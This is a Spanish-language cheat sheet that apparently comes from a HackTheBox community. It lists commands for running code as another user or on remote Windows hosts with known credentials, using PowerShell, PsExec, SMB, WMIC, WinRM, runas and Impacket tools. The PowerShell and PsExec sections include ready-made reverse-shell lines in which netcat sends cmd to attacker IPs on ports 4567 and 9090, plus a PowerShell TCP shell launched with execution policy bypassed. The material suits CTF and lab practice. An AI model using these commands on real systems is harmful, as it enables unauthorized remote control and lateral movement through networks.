POWERSHELL
-------------------------------------
$pass = ConvertTo-SecureString "pass" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("username", $pass)
$computer = "hostname"
[System.Diagnostics.Process]::Start("c:\nc64.exe","10.10.10.10 4567 -e cmd",$mycreds.Username, $mycreds.Password, $computer)


$pass = ConvertTo-SecureString "pass" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("username", $pass)
start-process -Credential $mycreds c:\users\"daniel lopez"\desktop\nc64.exe -argumentlist "10.10.10.10 4567 -e cmd"


$pass = ConvertTo-SecureString "pass" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("username", $pass)
invoke-wmimethod win32_process -name create -Credential $mycreds -argumentlist 'nc64.exe 10.10.13.6 9090 -e cmd'


EMPIRE --> spawnas


PsExec (PStools microsoft)
-----------------------------------
./PsExec64.exe -accepteula -u user -p pass cmd /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -File "C:\Tools\Invoke-PowerShellTcp.ps1"

PsExec64.exe -accepteula -u attl4s -p pass cmd /k C:\users\attl4s\desktop\nc64.exe 192.168.1.50 4567


SMB
------------------------------------
net use \\127.0.0.1 /user:domain\user pass
    net use    
    dir \\127.0.0.1\c$
    dir \\127.0.0.1\ADMIN$
    
    
WMIC (No se pueden usar las credenciales de usuario para conexiones locales) (Interactive)
----------------------------------
wmic /node:hostname /user:domain\user path win32_process call create calc.exe


WINRM
---------------------------
$pass = ConvertTo-SecureString "Zx^#QZX+T!123" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("username", $pass)
$computer = "machine"
Invoke-Command -Computer $computer -ScriptBlock {whoami} -credential $mycreds

$pass= ConvertTo-SecureString "pass" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("user", $pass)
$computer="hostname"
Enter-PSSession -ComputerName $computer -Credential $mycreds

    
RUNAS (Interactive)
-----------------------------------
runas /netonly /user:domain\user "cmd.exe"
    pass

REMOTO DESDE KALI
-------------------------
psexec.py user:pass@10.10.10.10
smbexec.py user:pass@10.10.10.10
wmiexec.py user:pass@10.10.10.10
CrackMapExec.py 10.10.10.10 -d domain -u user -p pass -x cmd

smbclient -U "Administrator" \\\\10.10.10.10\\C$
smbclient \\\\10.10.10.10\\Users -U user pass

rdp_check.py domain\user:pass@10.10.10.10
rdesktop -d domain -u user -p pass 10.10.10.10


Fuente
---
HackTheBox Hispano (Telegram)
